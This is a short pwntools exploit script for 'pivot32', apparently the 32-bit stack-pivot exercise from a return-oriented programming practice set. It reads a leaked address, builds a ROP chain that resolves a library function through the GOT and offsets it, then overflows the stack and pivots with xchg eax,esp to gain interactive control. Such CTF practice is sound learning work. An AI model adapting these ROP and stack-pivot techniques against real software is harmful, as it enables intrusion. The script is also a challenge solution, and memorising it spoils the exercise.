from pwn import *

context(arch='i386', os='linux', log_level='DEBUG')
f = './pivot32'
p = process(f)
elf = ELF(f)

p.recvuntil('pivot: ')
pivot = int(p.recvuntil('\n'), 16)
log.success('pivot: ' + hex(pivot))

foothold_plt = elf.plt['foothold_function']
foothold_got = elf.got['foothold_function']
pop_eax = 0x80488c0
mov_eax_eax = 0x80488c4
pop_ebx = 0x8048571
add_eax_ebx = 0x80488c7
call_eax = 0x80486a3

p.recvuntil('>')
payload = flat(foothold_plt, pop_eax, foothold_got, mov_eax_eax, pop_ebx, 0x1f7, add_eax_ebx, call_eax)
p.sendline(payload)

xchg_eax_esp = 0x80488c2
payload = flat('a'*0x2c, pop_eax, pivot, xchg_eax_esp)

p.recvuntil('>')
p.sendline(payload)

p.interactive()